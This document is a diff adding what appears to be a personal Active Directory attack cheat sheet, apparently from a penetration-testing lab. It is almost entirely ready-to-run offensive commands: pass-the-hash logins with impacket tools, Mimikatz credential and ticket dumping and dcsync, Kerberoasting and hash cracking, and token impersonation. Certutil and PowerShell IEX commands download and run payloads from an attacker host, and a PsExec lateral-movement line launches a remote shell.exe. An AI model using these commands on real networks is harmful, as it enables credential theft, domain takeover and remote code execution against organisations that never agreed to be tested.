@@ -1,0 +1,102 @@
+Steps:
+1) crack local hashes
+	- use hash to log in with psexec
+2) crack domain hashes
+3) run scripts
+	- enumerate.ps1
+	- user_enum.ps1
+	- computers.ps1
+	- load_spns.ps1
+4) run mimikatz
+	- passwords,		sekurlsa::logonpasswords
+	- TGS/TGTs,		sekurlsa::tickets
+	- lateral move		sekurlsa::pth /user:<computer> /domain:<domain> /ntlm:<ntlm hash> /run:"cmd.exe /c <executable>
+5) SPN TGS
+	PowerView.ps1 Invoke-Kerberoast
+
+# Cheat sheet
+https://dw3113r.com/2022/07/20/active-directory-attack-cheat-sheet/
+	
+# PowerView
+>powershell
+PS >Import-Module .\PowerView.ps1
+PS >Get-NetLoggedon
+
+# Log in with NTLM hash
+# aad3b435b51404eeaad3b435b51404ee is the common blank LM hash
+psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb" administrator@10.11.1.22
+dcomexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb" administrator@10.11.1.22
+wmiexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb" administrator@10.11.1.22
+atexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb" administrator@10.11.1.22
+smbexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb" administrator@10.11.1.22
+
+# Log in with username and password
+psexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24
+dcomexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24
+wmiexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24
+atexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24
+smbexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24
+
+# Execute over psexec.py
+psexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24 'certutil.exe -urlcache -split -f http://192.168.119.163/shell.exe'
+psexec.py svcorp.com/carol:ThisIsTheUsersPassword16@10.11.1.24 'cmd.exe /c %TEMP%\shell.exe'
+
+
+#Enumerate
+net user /domain
+net user adam /domain
+net group /domain
+powershell -c [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+powershell -noexit "& "".\enumerate.ps1"""
+powershell -noexit "& ""C:\ldap.ps1"""
+
+powershell -noexit "& ""C:\PowerView.ps1"""
+
+.\mimikatz.exe
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+sekurlsa::tickets
+lsadump::dcsync /domain:svcorp.com /all
+
+impacket-secretsdump -just-dc-ntlm -hashes "aad3b435b51404eeaad3b435b51404ee:63485d30576a1a741106e3e800053b34" administrator@10.11.1.20
+
+Invoke-Kerberoast.ps1
+kirbi2john.py 0.kirbi > crack_file
+john --format=krb5tgs crack_file --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Crack SPN tickets
+/usr/share/kerberoast/tgsrepcrack.py
+
+mimikatz.exe
+	sekurlsa::pth /user:Administrator /domain:xor.com /ntlm:3fee04b01f59a1001a366a7681e95699 /run:PowerShell.exe
+	
+# Crack SPN TGS
+# First load all spns
+powershell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.163/load_spns.txt');"
+# Then use kerberoast
+powershell
+Import-module PowerView.ps1
+invoke-kerberoast
+# or 
+powershell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.208/PowerView.ps1');Invoke-Kerberoast;"
+# crack the hash
+hashcat -m 13100 -a 0 --quiet --potfile-disable spn_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Impoersonate user
+powershell
+Import-module PowerView.ps1
+Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
+
+
+# Dump all ntlm hashes on DC
+impacket-secretsdump -just-dc-ntlm xor.com/david:dsfdf34534tdfGDFG5rdgr@10.11.1.120
+
+# Crack domain hashes
+# copy just the hash portion.  Leave off the domain, username, and colon
+XOR.COM/Administrator:$DCC2$10240#Administrator#68381d9a192e14343ea381574668c83c
+hashcat -m 2100 -a 0 --quiet --potfile-disable domain_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Lateral movement from mimikatz
+# If a TGT is already loaded (run `sekurlsa::tickets`), we can use over-pass-the-hash to 
+sekurlsa::pth /user:pete /domain:svcorp.com /ntlm:0f951bc4fdc5dfcd148161420b9c6207 /run:"cmd.exe /c \\192.168.119.163\juju\PsExec.exe \\sv-file01.svcorp.com -accepteula \\192.168.119.163\juju\shell.exe"
